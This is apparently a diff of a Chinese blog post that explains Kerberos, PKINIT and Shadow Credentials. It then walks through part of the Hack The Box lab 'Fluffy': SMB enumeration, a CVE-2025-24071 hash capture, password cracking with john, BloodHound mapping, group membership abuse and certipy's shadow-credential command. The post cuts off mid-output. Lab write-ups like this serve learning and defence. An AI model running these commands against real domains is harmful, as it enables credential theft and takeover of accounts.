@@ -19,14 +19,16 @@
   <meta name="author" content="CXCX">
   <meta name="keywords" content="">
   
-    <meta property="og:type" content="article">
+    <meta name="description" content="前置知识Kerberos概述Kerberos 是一种无密码计算机网络安全身份验证协议，具有身份验证和安全性的功能。 Kerberos 不使用传统的密码验证，而是使用强效、限时密钥加密，多个密钥和第三方服务器来验证客户端-服务器应用程序和身份验证。 Kerberos 主要组成部分为：User&#x2F;Client , KDC-AS-TGS , Service&#x2F;Application KDCKDC （密钥分发">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Shadow Credentials 初探">
 <meta property="og:url" content="https://r3bir7hcx.github.io/2025/06/03/Shadow-Credentials-%E5%88%9D%E6%8E%A2/index.html">
 <meta property="og:site_name" content="CXCX&#39;s Singularity">
+<meta property="og:description" content="前置知识Kerberos概述Kerberos 是一种无密码计算机网络安全身份验证协议，具有身份验证和安全性的功能。 Kerberos 不使用传统的密码验证，而是使用强效、限时密钥加密，多个密钥和第三方服务器来验证客户端-服务器应用程序和身份验证。 Kerberos 主要组成部分为：User&#x2F;Client , KDC-AS-TGS , Service&#x2F;Application KDCKDC （密钥分发">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://r3bir7hcx.github.io/img/articleImg/14.jpg">
 <meta property="article:published_time" content="2025-06-03T03:46:26.000Z">
-<meta property="article:modified_time" content="2025-06-03T03:46:45.232Z">
+<meta property="article:modified_time" content="2025-06-04T10:00:51.495Z">
 <meta property="article:author" content="CXCX">
 <meta property="article:tag" content="渗透">
 <meta property="article:tag" content="域">
@@ -236,7 +238,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 words
+          2.5k words
         
       </span>
     
@@ -247,7 +249,7 @@
         
         
         
-          1 mins
+          21 mins
         
       </span>
     
@@ -289,7 +291,134 @@
             
               <div class="markdown-body">
                 
-                
+                <h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p><code>Kerberos</code> 是一种无密码计算机网络安全身份验证协议，具有身份验证和安全性的功能。</p>
+<p><code>Kerberos</code> 不使用传统的密码验证，而是使用强效、限时密钥加密，多个密钥和第三方服务器来验证客户端-服务器应用程序和身份验证。</p>
+<p><code>Kerberos</code> 主要组成部分为：<code>User/Client</code> , <code>KDC-AS-TGS</code> , <code>Service/Application</code></p>
+<h3 id="KDC"><a href="#KDC" class="headerlink" title="KDC"></a>KDC</h3><p><code>KDC</code> （密钥分发中心）是一种集中式服务器，用于充当<code>Kerberos</code> 的第三方身份验证服务器。KDC中包括一个执行初始身份验证的身份验证服务器<code>AS</code>，一个颁发服务票据并将服务请求用户链接到服务服务器<code>SS</code>的票据授予服务器<code>TGS</code>，以及存储所有已验证用户的详细信息的<code>Kerberos</code>数据库（即所有身份验证信息以及授权）</p>
+<h3 id="它是如何工作的？"><a href="#它是如何工作的？" class="headerlink" title="它是如何工作的？"></a>它是如何工作的？</h3><ol>
+<li><p><strong>AS Request</strong> : <code>User/Client</code> 要访问服务，会启动 <code>Kerberos</code> 的初始身份验证 （也叫预身份验证，默认开启。如若关闭可能会造成 <code>AS-REP Roasting</code>），如此，会向 <code>Kerberos KDC AS</code> 发出请求<code>AS-REQ</code> 进行初始身份验证，此请求不包含敏感信息，所以为纯文本格式。<code>AS</code> 首先验证客户端是否在 <code>KDC</code> 数据库中，并检索请求中携带的客户端私钥。</p>
+<blockquote>
+<p>关于预身份验证<code>Pre-Authentication</code></p>
+<p>在<code>Kerberos</code> 中默认启用，请求中会包含由用户密码派生密钥加密的时间戳。</p>
+</blockquote>
+</li>
+<li><p><strong>AS Response</strong> : <code>AS</code> 通过在数据库中查找发起请求的客户端的用户名来进行预身份验证，如果找到，则会颁发票证授予票证<code>TGT</code>和会话密钥，否则会启动身份验证失败。</p>
+<blockquote>
+<p>关于会话密钥 <code>session key</code></p>
+<p>会话密钥是随机生成的加密和解密密钥，用于保证通信的安全。</p>
+<p>关于 <code>AS-REP</code></p>
+<p>包含 TGT，EncPart</p>
+<p>关于票证授予票证<code>TGT</code></p>
+<p>此时通过验证之后 AS-REP返回的数据中包含 TGT 和 会话密钥。而TGT是 AS 和 TGT 之间的密钥加密后的票证，给TGS使用。</p>
+<p>其中的 <code>session key</code> 是交由 TGS使用</p>
+<p>关于 <code>EncPart</code></p>
+<p>使用的密钥是客户端的，客户端能用自己的密码解密。拿到会话密钥和TGT。</p>
+</blockquote>
+</li>
+<li><p><strong>Service Ticket Request</strong> : 通过AS身份验证后，客户端会向 <code>TGS</code> 发送请求服务票证，此请求必须包含 <code>TGT</code></p>
+</li>
+<li><p><strong>Service Ticket Response</strong> : 如果 <code>TGS</code> 可以对客户端进行身份验证，那么会发送针对服务请求的<strong>票据和凭证</strong>，以允许客户端访问服务。此传输使用的是<strong>用户和服务</strong>的会话密钥加密的。</p>
+</li>
+<li><p><strong>Application Server Request</strong> : 客户端请求应用程序服务器，必须包含服务票据<code>ST</code>。如果验证通过则允许访问。</p>
+</li>
+<li><p><strong>Application Server Response</strong>：返回响应</p>
+</li>
+</ol>
+<blockquote>
+<p>任何票据都是携带时间戳的，只能在特定时间内使用。在这段时间内无需再次执行身份验证。</p>
+</blockquote>
+<h2 id="PKINIT"><a href="#PKINIT" class="headerlink" title="PKINIT"></a>PKINIT</h2><p><code>PKINIT</code> 是 <code>Kerberos</code> 的一种扩展，使用非对称密钥加密。</p>
+<p>启用这种扩展的简单认证流程：</p>
+<ol>
+<li><p>客户端具有私钥-公钥对，在预身份验证阶段，客户端使用自己的私钥对预身份验证数据（AuthPack）进行签名，其中包含着时间戳，客户端信息，证书以及客户端公钥。</p>
+</li>
+<li><p>KDC接收到使用客户端的公钥进行签名验证是否合法，并且使用客户端的公钥加密生成的<code>Session Key</code>。</p>
+</li>
+<li><p>身份验证通过则返回AS-REP，此时客户端使用私钥解密<code>Session Key</code></p>
+</li>
+</ol>
+<p>它还支持俩种方法交换会话密钥：</p>
+<ol>
+<li><code>Diffie-Hellman</code> (DH) : 传递<code>DH</code>密钥以允许KDC和客户端安全地建立共享会话密钥，可以有效阻止中间人攻击，如果使用这种方法交换会话密钥，那么在认证流程的请求阶段中的预身份验证数据中会包含<code>DH公钥</code>，而在KDC中会使用<code>DH私钥</code>与客户端的<code>DH公钥</code> 计算出共享密钥，用这个共享密钥对 <code>EncPart</code>中的<code>Session Key</code> 进行加密。接着客户端使用自己的<code>DH私钥</code>进行解密。</li>
+<li><code>Public Key Encryption</code> : 使用KDC的私钥和客户端的公钥来生成会话密钥。</li>
+</ol>
+<h2 id="Key-Trust-model"><a href="#Key-Trust-model" class="headerlink" title="Key Trust model"></a>Key Trust model</h2><p>在 <code>Key Trust Model</code> 下，在客户端中拥有一个存储公钥的属性<code>msDs-KeyCredentialLink</code>。（注意，这个属性在<code>Windows Server 2016</code> 就已经存在，不局限于<code>PKINIT</code>）此为一个多值属性，但在这篇文章中我们重点关注它能够存储公钥信息这个特点。</p>
+<p>此模型的存在不再需要为每个客户端颁发证书，但域控必须有用于会话密钥交换的证书。(默认情况下，存在AD CS和CA，域控会自动获取证书)。</p>
+<p>那么这个模型下的验证流程是怎样的？</p>
+<ol>
+<li>客户端发送<code>AS-REQ</code>。其中携带着包含客户端公钥和客户端私钥加密的时间戳的<code>Pre-Authentication</code>。</li>
+<li>KDC接收<code>AS-REQ</code>，针对<code>msDS-KeyCredentialLink</code> 进行公钥验证，并且对时间戳进行解密并验证。</li>
+<li>KDC响应<code>AS-REP</code>，返回<code>TGT</code>与<code>Session Key</code></li>
+</ol>
+<hr>
+<p>而在密钥信任模型与<code>PKINIT</code>的结合下 （前者支持无密码验证，后者支持证书验证。俩者结合实现了无密码基于公钥的认证），我们如果能够对<code>msDS-KeyCredentialLink</code>进行修改，则可以获得<code>TGT</code>与<code>Session Key</code>。</p>
+<h1 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h1><ul>
+<li>目标DC必须有自己的证书</li>
+<li>攻击者必须对目标用户或计算机对象的<code>msDS-KeyCredentialLink</code>具有修改权限。</li>
+<li>拥有ADCS，且支持 <code>SmartcardLogon</code> 与 <code>SmartcardUser</code> 的证书模板。</li>
+<li>是否启用<code>PKINIT</code> （<code>Windows Server 2008</code>之后默认启用）</li>
+</ul>
+<h1 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h1><blockquote>
+<p>借鉴一下HTB-Fluffy。只会演示存在该漏洞的部分。</p>
+</blockquote>
+<p>As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman &#x2F; J0elTHEM4n1990!</p>
+<h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs shell">Scanned at 2025-06-04 16:03:14 CST for 146s<br>Not shown: 65524 filtered tcp ports (no-response)<br>PORT      STATE SERVICE       REASON          VERSION<br>53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus<br>88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-04 14:42:39Z)<br>139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn<br>445/tcp   open  microsoft-ds? syn-ack ttl 127<br>3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=DC01.fluffy.htb<br>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb<br>| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy<br>| Public Key type: rsa<br>| Public Key bits: 2048<br>| Signature Algorithm: sha256WithRSAEncryption<br>| Not valid before: 2025-04-17T16:04:17<br>| Not valid after:  2026-04-17T16:04:17<br>| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880<br>| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681<br>| -----BEGIN CERTIFICATE-----<br>| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF<br>| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5<br>| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAeFw0yNTA0MTcxNjA0MTdaFw0yNjA0<br>| MTcxNjA0MTdaMBoxGDAWBgNVBAMTD0RDMDEuZmx1ZmZ5Lmh0YjCCASIwDQYJKoZI<br>| hvcNAQEBBQADggEPADCCAQoCggEBAOFkXHPh6Bv/Ejx+B3dfWbqtAmtOZY7gT6XO<br>| KD/ljfOwRrRuvKhf6b4Qam7mZ08lU7Z9etWUIGW27NNoK5qwMnXzw/sYDgGMNVn4<br>| bb/2kjQES+HFs0Hzd+s/BBcSSp1BnAgjbBDcW/SXelcyOeDmkDKTHS7gKR9zEvK3<br>| ozNNc9nFPj8GUYXYrEbImIrisUu83blL/1FERqAFbgGwKP5G/YtX8BgwO7iJIqoa<br>| 8bQHdMuugURvQptI+7YX7iwDFzMPo4sWfueINF49SZ9MwbOFVHHwSlclyvBiKGg8<br>| EmXJWD6q7H04xPcBdmDtbWQIGSsHiAj3EELcHbLh8cvk419RD5ECAwEAAaOCAzgw<br>| ggM0MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs<br>| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD<br>| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME<br>| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg<br>| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFMlh3+130Pna<br>| 0Hgb9AX2e8Uhyr0FMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHI<br>| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNB<br>| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl<br>| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZp<br>| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0<br>| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6<br>| Ly8vQ049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl<br>| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERD<br>| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv<br>| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBB0co4Ym5z7RbSI<br>| 5tsj1jN/gg9EQzAxLmZsdWZmeS5odGIwTgYJKwYBBAGCNxkCBEEwP6A9BgorBgEE<br>| AYI3GQIBoC8ELVMtMS01LTIxLTQ5NzU1MDc2OC0yNzk3NzE2MjQ4LTI2MjcwNjQ1<br>| NzctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAWjL2YkginWECPSm1EZyi8lPQisMm<br>| VNF2Ab2I8w/neK2EiXtN+3Z7W5xMZ20mC72lMaj8dLNN/xpJ9WIvQWrjXTO4NC2o<br>| 53OoRmAJdExwliBfAdKY0bc3GaKSLogT209lxqt+kO0fM2BpYnlP+N3R8mVEX2Fk<br>| 1WXCOK7M8oQrbaTPGtrDesMYrd7FQNTbZUCkunFRf85g/ZCAjshXrA3ERi32pEET<br>| eV9dUA0b1o+EkjChv+b1Eyt5unH3RDXpA9uvgpTJSFg1XZucmEbcdICBV6VshMJc<br>| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==<br>|_-----END CERTIFICATE-----<br>|_ssl-date: 2025-06-04T14:44:11+00:00; +6h38m31s from scanner time.<br>49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC<br>49685/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0<br>49687/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC<br>49703/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC<br>49711/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC<br>49740/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC<br>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| p2p-conficker: <br>|   Checking for Conficker.C or higher...<br>|   Check 1 (port 53865/tcp): CLEAN (Timeout)<br>|   Check 2 (port 37046/tcp): CLEAN (Timeout)<br>|   Check 3 (port 5751/udp): CLEAN (Timeout)<br>|   Check 4 (port 59113/udp): CLEAN (Timeout)<br>|_  0/4 checks are positive: Host is CLEAN or ports are blocked<br>| smb2-time: <br>|   date: 2025-06-04T14:43:31<br>|_  start_date: N/A<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled and required<br>|_clock-skew: mean: 6h38m30s, deviation: 0s, median: 6h38m29s<br><br>NSE: Script Post-scanning.<br>NSE: Starting runlevel 1 (of 3) scan.<br>Initiating NSE at 16:05<br>Completed NSE at 16:05, 0.00s elapsed<br>NSE: Starting runlevel 2 (of 3) scan.<br>Initiating NSE at 16:05<br>Completed NSE at 16:05, 0.00s elapsed<br>NSE: Starting runlevel 3 (of 3) scan.<br>Initiating NSE at 16:05<br>Completed NSE at 16:05, 0.00s elapsed<br>Read data files from: /usr/share/nmap<br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 146.63 seconds<br>           Raw packets sent: 393200 (17.301MB) | Rcvd: 87 (4.508KB)<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>DC: dc01.fluffy.htb</p>
+<p>Domain-User :  j.fleischman</p>
+<p>Domain-Pass : J0elTHEM4n1990!</p>
+</blockquote>
+<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><h3 id="获取共享目录"><a href="#获取共享目录" class="headerlink" title="获取共享目录"></a>获取共享目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿vbox)-[~]<br>└─# netexec smb $ip -u &#x27;j.fleischman&#x27; -p &#x27;J0elTHEM4n1990!&#x27; --shares<br>SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)<br>SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! <br>SMB         10.10.11.69     445    DC01             [*] Enumerated shares<br>SMB         10.10.11.69     445    DC01             Share           Permissions     Remark<br>SMB         10.10.11.69     445    DC01             -----           -----------     ------<br>SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin<br>SMB         10.10.11.69     445    DC01             C$                              Default share<br>SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC<br>SMB         10.10.11.69     445    DC01             IT              READ,WRITE      <br>SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share <br>SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share<br></code></pre></td></tr></table></figure>
+
+<p>拥有4个目录可读，<code>IT</code>目录可写。读取所有目录中的文件。</p>
+<h3 id="获取目录中文件"><a href="#获取目录中文件" class="headerlink" title="获取目录中文件"></a>获取目录中文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿vbox)-[~]<br>└─# netexec smb $ip -u &#x27;j.fleischman&#x27; -p &#x27;J0elTHEM4N1990!&#x27; -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=10000<br>SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)<br>SMB         10.10.11.69     445    DC01             [-] fluffy.htb\j.fleischman:J0elTHEM4N1990! STATUS_LOGON_FAILURE <br>                                                                                                                     <br>┌──(root㉿vbox)-[~]<br>└─# netexec smb $ip -u &#x27;j.fleischman&#x27; -p &#x27;J0elTHEM4n1990!&#x27; -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=10000<br>SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)<br>SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! <br>SPIDER_PLUS 10.10.11.69     445    DC01             [*] Started module spidering_plus with the following options:<br>SPIDER_PLUS 10.10.11.69     445    DC01             [*]  DOWNLOAD_FLAG: True<br>SPIDER_PLUS 10.10.11.69     445    DC01             [*]     STATS_FLAG: True<br>SPIDER_PLUS 10.10.11.69     445    DC01             [*] EXCLUDE_FILTER: [&#x27;print$&#x27;, &#x27;ipc$&#x27;]<br>SPIDER_PLUS 10.10.11.69     445    DC01             [*]   EXCLUDE_EXTS: [&#x27;ico&#x27;, &#x27;lnk&#x27;]<br>SPIDER_PLUS 10.10.11.69     445    DC01             [*]  MAX_FILE_SIZE: 9.77 KB<br>SPIDER_PLUS 10.10.11.69     445    DC01             [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus<br>SPIDER_PLUS 10.10.11.69     445    DC01             [+] Saved share-file metadata to &quot;/root/.nxc/modules/nxc_spider_plus/10.10.11.69.json&quot;.<br>SPIDER_PLUS 10.10.11.69     445    DC01             [*] Total folders found:  0<br>SPIDER_PLUS 10.10.11.69     445    DC01             [*] Total files found:    0<br></code></pre></td></tr></table></figure>
+
+<p>其中有一个PDF</p>
+<p><img src="/img/Shadow-Credentials-%E5%88%9D%E6%8E%A2/image-20250604161428293.png" srcset="/img/loading.gif" lazyload></p>
+<p>打<code>CVE-2025-24071</code>。这里因为<code>IT</code>目录是可写的。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/0x6rss/CVE-2025-24071_PoC">https://github.com/0x6rss/CVE-2025-24071_PoC</a></p>
+<h2 id="CVE-2025-24071"><a href="#CVE-2025-24071" class="headerlink" title="CVE-2025-24071"></a>CVE-2025-24071</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SHELL">smbclient //$ip/IT -U j.fleischman%J0elTHEM4n1990!<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/Shadow-Credentials-%E5%88%9D%E6%8E%A2/image-20250604162624405.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>john</code>爆破。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿vbox)-[~/HackTheBox/fluffy]<br>└─# john hash --wordlist=/usr/share/wordlists/rockyou.txt <br>Created directory: /root/.john<br>Using default input encoding: UTF-8<br>Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>prometheusx-303  (p.agila)     <br>1g 0:00:00:06 DONE (2025-06-04 16:27) 0.1615g/s 729755p/s 729755c/s 729755C/s prometonollorar..promessemaxime2<br>Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably<br>Session completed.<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>DC: dc01.fluffy.htb</p>
+<p>Domain-User :  j.fleischman</p>
+<p>Domain-Pass : J0elTHEM4n1990!</p>
+<p>Domain-User : p.agila</p>
+<p>Domain-Pass : prometheusx-303</p>
+</blockquote>
+<h2 id="Shadow-Crendentilas"><a href="#Shadow-Crendentilas" class="headerlink" title="Shadow Crendentilas"></a>Shadow Crendentilas</h2><p>查看域内关系图 </p>
+<h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">bloodhound-python -u &#x27;p.agila&#x27; -p &#x27;prometheusx-303&#x27; -d $d -ns $ip -c All --zip<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/Shadow-Credentials-%E5%88%9D%E6%8E%A2/image-20250604164419913.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>p.agila</code> 用户隶属于 <code>SERVICE ACCOUNT MANAGERS</code> 组，而 <code>SERVICE ACCOUNT MANAGERS</code> 组拥有对 <code>SERVICE ACCOUNTS</code> 组的所有权限。那么我们先把 <code>p.agila</code> 用户添加进 <code>SERVICE ACCOUNTS</code> 组。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿vbox)-[/tmp]<br>└─# bloodyAD --host $ip -d $dc -u &#x27;p.agila&#x27; -p &#x27;prometheusx-303&#x27; add groupMember &#x27;SERVICE ACCOUNTS&#x27; &#x27;p.agila&#x27;   <br>[+] p.agila added to SERVICE ACCOUNTS<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/Shadow-Credentials-%E5%88%9D%E6%8E%A2/image-20250604165001423.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>SERVICE ACCOUNTS</code> 组有三个成员。我们需要查看这三个成员的属性。</p>
+<h3 id="获取先决条件"><a href="#获取先决条件" class="headerlink" title="获取先决条件"></a>获取先决条件</h3><blockquote>
+<p>以下条件是在攻击之后发掘的，为什么会想到 Shadow Credentials，是因为对这三个用户具有修改权限。</p>
+</blockquote>
+<p>域中存在：ADCS以及CA，域控自动获取证书。</p>
+<p>当前获取到的<code>p.agila</code>。拥有对<code>SERVICE ACCOUNTS</code> 组的所有权限 </p>
+<p>拥有ADCS，且支持俩种证书模板</p>
+<p><img src="/img/Shadow-Credentials-%E5%88%9D%E6%8E%A2/image-20250604175059603.png" srcset="/img/loading.gif" lazyload></p>
+<p>确认启用了<code>PKINIT</code></p>
+<p><img src="/img/Shadow-Credentials-%E5%88%9D%E6%8E%A2/image-20250604175113648.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="伪造公钥凭证"><a href="#伪造公钥凭证" class="headerlink" title="伪造公钥凭证"></a>伪造公钥凭证</h3><p>在执行影子凭证攻击之前，我们需要<strong>同步下时间</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ntldate $ip <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">                                                                                                                     <br>┌──(root㉿vbox)-[/tmp]<br>└─# certipy-ad shadow auto -u &#x27;p.agila@fluffy.htb&#x27; -p prometheusx-303 -dc-ip &#x27;10.10.11.69&#x27; -account &#x27;winrm_svc&#x27;<br><br>Certipy v5.0.2 - by Oliver Lyak (ly4k)<br><br>[*] Targeting user &#x27;winrm_svc&#x27;<br>[*] Generating certificate<br>[*] Certificate generated<br>[*] Generating Key Credential<br>[*] Key Credential generated with DeviceID &#x27;a2f5eeba-1cbb-ad26-7946-af83048de07a&#x27;<br>[*] Adding Key Credential with device ID &#x27;a2f5eeba-1cbb-ad26-7946-af83048de07a&#x27; to the Key Credentials for &#x27;winrm_svc&#x27;<br>[*] Successfully added Key Credential with device ID 